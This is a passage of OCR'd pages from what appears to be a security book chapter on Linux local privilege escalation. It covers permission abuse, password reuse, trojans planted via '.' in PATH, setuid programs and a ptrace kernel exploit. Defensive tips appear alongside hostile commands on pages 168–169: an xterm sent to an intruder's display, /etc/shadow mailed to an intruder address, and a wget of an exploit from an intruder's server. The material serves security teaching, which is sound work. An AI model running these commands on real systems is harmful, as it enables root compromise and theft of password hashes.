- pgno: 166
  md: 'Many vulnerabilities allow intruders to gain nonprivileged access to remote
    hosts. After obtaining normal user privileges, the next logical step for an intruder
    to take is to gain root (superuser) access. In addition to external intruders,
    malicious local users may also attempt to exploit local vulnerabilities in order
    to obtain superuser privileges.


    The act of elevating privileges to that of the superuser is usually referred to
    as privilege escalation. This chapter describes methods an individual with normal
    user privileges may attempt to obtain superuser privileges.


    # # EXPLOITING LOCAL TRUST


    In most cases, firewalls are configured to restrict access from external hosts
    and networks. Traffic on the loopback interface (127.0.0.1) is often unrestricted.
    In fact, filtering traffic on the loopback interface may cause many applications
    to break. A local user may use this condition to his or her advantage and attempt
    to scan, enumerate, and exploit services that aren''t accessible remotely. Therefore,
    once an attacker has gained local user access to a host, he or she may attempt
    all the hacking techniques described in the previous chapters of this book in
    order to escalate privileges.


    # # GROUP MEMBERSHIPS AND INCORRECT FILE PERMISSIONS


    Incorrect file permissions may allow a malicious user to read or write to files
    that they do not have access to. The following sections describe how a malicious
    user may exploit incorrect file permissions to escalate his or her privileges.


    # ## Find Group-Owned Files


    Suppose an intruder has gained access to the local account “joe.” He or she may
    find out all the groups “joe” belongs to by issuing the id command:


    ```

    (bash)$ id

    uid=500(joe) gid=500(joe) groups=500(joe),501(proj1)

    ```'
  merge: -1
  img_proc: true
- pgno: 167
  md: 'After noticing that "joe" belongs to the group "proj", the intruder may issue
    the following command, which will list all the files owned by the "proj" group:


    ```

    ```bash

    [bash]$ find / -group proj -print 2> /dev/null

    /var/proj1/main.c

    /var/proj1/main.o

    /var/proj1/README

    /var/proj1/passw.txt

    /var/log/proj1

    ```

    ```


    Now, the intruder knows exactly what "proj" files "joe" has access to. One of
    these files, passw.txt, may seem pretty interesting:


    ```

    ```bash

    [bash]$ more /var/proj1/passw.txt

    ```

    ```


    Note that this program authenticates to the MySQL database with the system password
    “r00t3rp455w.”


    Administrators often reuse passwords. If the victim host’s root password was the
    same as the MySQL password shown in the preceding note, then the intruder may
    gain root privileges by issuing the su command:


    ```

    ```bash

    [bash]$ su -

    Password:r00t3rp455w

    [bash]# id

    uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon),

    3(sys), 4(adm), 6(disk),10(wheel)

    ```

    ```


    # ## Find World-Readable and -Writable Files


    In addition to searching for group-readable files, it is also possible to search
    for world-readable files that a user may have access to. For example, here is
    how you would search for all world-readable files present in the /etc directory:


    ```

    ```bash

    [bash]$ find /etc -type f -perm -4 -print 2> /dev/null

    ```

    ```


    Many files in /etc should not be world-readable. For example, the /etc/shadow
    file contains encrypted passwords of users. Anyone with access to this file may
    brute-force crack user passwords using tools such as John the Ripper.


    An intruder may attempt to search for world-writable files by issuing the following
    command:


    ```

    ```bash

    [bash]$ find / -type f -perm -2 -print 2> /dev/null

    /usr/sbin/in.telnetd

    ```

    ```'
  merge: -1
  img_proc: true
- pgno: 168
  md: 'In this example, the intruder''s *"joe"* account has write permissions to in.telnetd.
    The inetd or xinetd service on the victim host will invoke the in.telnetd file
    every time an incoming telnet connection is made to the host. The intruder may
    edit the in.telnetd file and place the following contents in it:


    ```

    #!/bin/bash

    xterm -display intruder_s_ip_address:0.0 &

    ```


    Now, the intruder may execute the following on his or her host:


    ```

    xhost +victim_v_s_ip_address

    ```


    This gives the victim machine permission to display an X program on the intruder’s
    X server. All the intruder needs to do now is telnet to the victim host, which
    will make inetd or xinetd invoke /usr/sbin/in.telnetd with root privileges, causing
    a root xterm from the victim host to be presented to the intruder!


    ![](img/77287f6ef97ef0bed6e23f6610950d06_168_0.png)


    # ### Ensure Proper Permissions

    Routinely audit files to ensure proper file permissions.


    # ## “.” IN PATH


    When a user executes a command, the command shell searches for the location of
    the command in the list of directories contained in the PATH environment variable:


    ```

    [bash]$ echo $PATH

    /usr/local/sbin:/usr/local/bin:/usr/bin:/home/joe/bin:/bin

    ```


    Suppose the root user has the current directory (*"."*) in his PATH:


    ```

    …:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/bin:/bin

    ```


    Now, every time the root user executes a command such as ls, the shell first looks
    for *"."* in the current directory, and then it searches the other directories
    as listed in the PATH variable.


    ![](img/77287f6ef97ef0bed6e23f6610950d06_168_1.png)


    # ### Exploit *"."* in PATH to Plant Trojans


    A malicious user or intruder who has access to a local account such as *"joe"*
    may create a file called *"ls"* and place it in the victim user’s home directory
    (*/home/joe*) with the following contents:'
  merge: -1
  img_proc: true
- pgno: 169
  md: '```

    #!/bin/bash

    cat /etc/shadow | mail intruder@intruder_email.com

    /bin/ls

    ```


    If the root user were to now cd into joe''s directory and request a directory
    listing by issuing the 1s command, the preceding “ls” script in joe''s directory
    would be executed with root permissions. This would cause the /etc/shadow file
    to be mailed to the intruder. Since the “ls” script calls the real /bin/ls program
    at the end, the root user would be presented with the directory listing as requested.


    # Do Not Include “.” in PATH

    Never include the current directory (“.”) in your PATH.


    # SOFTWARE VULNERABILITIES


    Setuserid programs execute with the privileges of the file owner. Therefore, root-owned
    setuid files will always execute as root no matter who executes them. Attackers
    often concentrate on setuid programs for vulnerabilities, since these often lead
    to privilege escalation.


    Use the following command to locate setuserid programs:


    ```

    find / -perm -4000 -type f -print 2> /dev/null

    ```


    Vulnerabilities in software installed on a host may allow a malicious user to
    gain privileges. What follows are examples of the different kinds of software
    vulnerabilities that a local user may attempt to exploit.


    # Kernel Flaws


    Vulnerabilities within the operating system kernel are also susceptible to exploitation
    by local users. Consider the Linux “ptrace” vulnerability, which exploits a race
    condition flaw in 2.2 and 2.4 kernels.


    # The Ptrace Exploit


    In order to exploit the ptrace vulnerability, all an intruder needs to do is obtain
    and run the exploit on the victim machine:


    ```

    [bash]$ wget http://intruder''s_web_server/ptrace.c

    --:17:03:52--  http://intruder''s_web_server/ptrace.c

    ==> ''ptrace.c''

    Resolving intruder''s_web_server... done.

    Connecting to intruder''s_web_server[10.0.0.1]:80... connected.

    HTTP request sent, awaiting response... 200 OK

    ```'
